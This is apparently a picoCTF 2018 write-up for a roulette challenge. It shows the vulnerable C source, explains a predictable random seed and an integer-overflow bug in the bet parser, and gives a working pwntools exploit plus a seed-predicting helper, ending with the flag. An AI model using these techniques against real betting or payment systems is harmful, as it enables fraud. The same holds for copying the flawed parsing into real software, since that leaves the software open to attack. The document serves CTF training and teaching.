# Problem
This Online [Roulette](https://2018shell1.picoctf.com/static/46f10459dc84c1b88b62ab8740afdb19/roulette) Service is in Beta. Can you find a way to win $1,000,000,000 and get the flag? [Source](https://2018shell1.picoctf.com/static/46f10459dc84c1b88b62ab8740afdb19/roulette.c). Connect with nc ```2018shell1.picoctf.com 21444```

## Hints:
There are 2 bugs!

## Solution:

First, we download the files and try to execute it
```bash
wget https://2018shell1.picoctf.com/static/46f10459dc84c1b88b62ab8740afdb19/roulette
wget https://2018shell1.picoctf.com/static/46f10459dc84c1b88b62ab8740afdb19/roulette.c
chmod +x ./roulette
./roulette

Welcome to ONLINE ROULETTE!
Here, have $1627 to start on the house! You'll lose it all anyways >:)

How much will you wager?
Current Balance: $1627   Current Wins: 0
> 
```

Lets look at the source:
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <limits.h>

#define MAX_NUM_LEN 12
#define HOTSTREAK 3
#define MAX_WINS 16
#define ONE_BILLION 1000000000
#define ROULETTE_SIZE 36
#define ROULETTE_SPINS 128
#define ROULETTE_SLOWS 16
#define NUM_WIN_MSGS 10
#define NUM_LOSE_MSGS 5

long cash = 0;
long wins = 0;

int is_digit(char c) {
    return '0' <= c && c <= '9';
}

long get_long() {
    printf("> ");
    uint64_t l = 0;
    char c = 0;
    while(!is_digit(c))
      c = getchar();
    while(is_digit(c)) {
      if(l >= LONG_MAX) {
   l = LONG_MAX;
   break;
      }
      l *= 10;
      l += c - '0';
      c = getchar();
    }
    while(c != '\n')
      c = getchar();
    return l;
}

long get_rand() {
  long seed;
  FILE *f = fopen("/dev/urandom", "r");
  fread(&seed, sizeof(seed), 1, f);
  fclose(f);
  seed = seed % 5000;
  if (seed < 0) seed = seed * -1;
  srand(seed);
  return seed;
}

long get_bet() {
  while(1) {
    puts("How much will you wager?");
    printf("Current Balance: $%lu \t Current Wins: %lu\n", cash, wins); 
    long bet = get_long(); 
    if(bet <= cash) {
      return bet;
    } else {
      puts("You can't bet more than you have!");
    }
  }
}

long get_choice() {
  while (1) {
    printf("Choose a number (1-%d)\n", ROULETTE_SIZE);
    long choice = get_long();
    if (1 <= choice && choice <= ROULETTE_SIZE) {
      return choice;
    } else {
      puts("Please enter a valid choice.");
    }
  }
}

int print_flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Failed to open the flag file\n");
    return -1;
  }
  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

const char *win_msgs[NUM_WIN_MSGS] = {
  "Wow.. Nice One!",
  "You chose correct!",
  "Winner!",
  "Wow, you won!",
  "Alright, now you're cooking!",
  "Darn.. Here you go",
  "Darn, you got it right.",
  "You.. win.. this round...",
  "Congrats!",
  "You're not cheating are you?",
};

const char *lose_msgs1[NUM_LOSE_MSGS] = {
  "WRONG",
  "Nice try..",
  "YOU LOSE",
  "Not this time..",
  "Better luck next time..."
};

const char *lose_msgs2[NUM_LOSE_MSGS] = {
  "Just give up!",
  "It's over for you.",
  "Stop wasting your time.",
  "You're never gonna win",
  "If you keep it up, maybe you'll get the flag in 100000000000 years"
};

void spin_roulette(long spin) {
  int n;
  puts("");
  printf("Roulette  :  ");
  int i, j;
  int s = 12500;
  for (i = 0; i < ROULETTE_SPINS; i++) {
    n = printf("%d", (i%ROULETTE_SIZE)+1);
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  for (i = ROULETTE_SPINS; i < (ROULETTE_SPINS+ROULETTE_SIZE); i++) {
    n = printf("%d", (i%ROULETTE_SIZE)+1);
    if (((i%ROULETTE_SIZE)+1) == spin) {
      for (j = 0; j < n; j++) {
   printf("\b \b");
      }
      break;
    }
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  for (int k = 0; k < ROULETTE_SIZE; k++) {
    n = printf("%d", ((i+k)%ROULETTE_SIZE)+1);
    s = 1.1*s;
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  printf("%ld", spin);
  usleep(s);
  puts("");
  puts("");
}

void play_roulette(long choice, long bet) {
  
  printf("Spinning the Roulette for a chance to win $%lu!\n", 2*bet);
  long spin = (rand() % ROULETTE_SIZE)+1;

  spin_roulette(spin);
  
  if (spin == choice) {
    cash += 2*bet;
    puts(win_msgs[rand()%NUM_WIN_MSGS]);
    wins += 1;
  }
  else {
    puts(lose_msgs1[rand()%NUM_LOSE_MSGS]);
    puts(lose_msgs2[rand()%NUM_LOSE_MSGS]);
  }
  puts("");
}

int main(int argc, char *argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);

  cash = get_rand();
  
  puts("Welcome to ONLINE ROULETTE!");
  printf("Here, have $%ld to start on the house! You'll lose it all anyways >:)\n", cash);
  puts("");
  
  long bet;
  long choice;
  while(cash > 0) {
      bet = get_bet();
      cash -= bet;
      choice = get_choice();
      puts("");
      
      play_roulette(choice, bet);
      
      if (wins >= MAX_WINS) {
   printf("Wow you won %lu times? Looks like its time for you cash you out.\n", wins);
   printf("Congrats you made $%lu. See you next time!\n", cash);
   exit(-1);
      }
      
      if(cash > ONE_BILLION) {
   printf("*** Current Balance: $%lu ***\n", cash);
   if (wins >= HOTSTREAK) {
     puts("Wow, I can't believe you did it.. You deserve this flag!");
     print_flag();
     exit(0);
   }
   else {
     puts("Wait a second... You're not even on a hotstreak! Get out of here cheater!");
     exit(-1);
   }
   }
  }
  puts("Haha, lost all the money I gave you already? See ya later!");
  return 0;
}
```

Lets try to understand the functions.
* ```get_long()``` Gets a long, up to ```LONG_MAX``` (is that so?) from the input.
* ```get_rand()``` Returns a random value between 0 and 5000.
* ```get_bet()``` Reads the "bet" from the user (must be smaller or equal to the current cash).
* ```get_choice()``` Reads the "chioce" (```1``` to ```ROULETTE_SIZE (=36)``` from the user.
* ```play_roulette()``` Play double or nothing. If we "guess" correctly the outcome of the spin, we win.
* ```main()``` is doing the following:
* * Sets the initial "cash" the the random seed.
* * Prints the current "cash".
* * While we still got money:
* * * Gets a bet (```get_bet()```).
* * * Removes the amount from the cash.
* * * Gets choice from user (```get_choice()```).
* * * Plays the roulette (```play_roulette()```).
* * * If we have more then ```MAX_WINS (=16)``` wins, cashs us out.
* * * If we have more than ```ONE_BILLION (=1000000000)``` and we have at least ```HOTSTREAK (=3)``` wins, we get the flag.

There are two problems:
1. Its hard to guess the outcome of the roulette (1 / 36).
1. Even if can got lucky, ```5000 * 2**16 = 327680000 < 1000000000```.

The hint says there are two bugs in the code:
1. If we know the seed (and we know it) and the algorithm of the random generator, we can predict the "random" sequence.
1. ```get_long()``` checks ```if(l >= LONG_MAX)``` **before** adding the digit. We can actually get almost ```10 * LONG_MAX``` which can be a negative number.

Our strategy will be to predict the sequence. Win a few bets and then lose a HUGE negative bet which will make us rich :) *there are few more minor details we need to take care of*

This code will generate the "random sequence" given the seed:
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <limits.h>

int main(int argc, char *argv[]) {
    int seed = atoi(argv[1]);

    srand(seed);

    for (int i = 0; i < 100; ++i)
        printf("%d,", rand());

    return 0;
}
```

And this is the "exploit":
```python
#!/usr/bin/env python

from pwn import *
import subprocess


r = remote('2018shell1.picoctf.com', 21444)

sleep(1)
lines = r.recvuntil('> ').split('\n')
print '\n'.join(lines)

balance = int(lines[1].split()[2][1:])

log.info("Start balance: {}".format(balance))

log.info("Predicting random values")
values = subprocess.check_output(["./get_rand_seq", str(balance)])
values = values.split(',')
values = [int(v, 10) for v in values[:-1]]

i = 0

ROULETTE_SIZE = 36

for _ in range(4):
   spin = (values[i] % ROULETTE_SIZE) + 1
   i += 2

   log.info("Putting {}$ on {}".format(balance, spin))

   r.sendline("{}".format(balance))
   r.sendline("{}".format(spin))

   balance *= 2

   print r.recvuntil('> ')

   print r.recv()

spin = (values[i] % ROULETTE_SIZE) + 1
i += 2

log.info("Putting {}$ on {}".format(11474836400, spin))

r.sendline("{}".format(11474836400)) # Put some negative numbers, bug in get_long
r.sendline("{}".format((spin + 1) % 36))

print r.recvuntil('You deserve this flag!')
print r.recvall()

r.close()
```

Cute!

Flag: picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}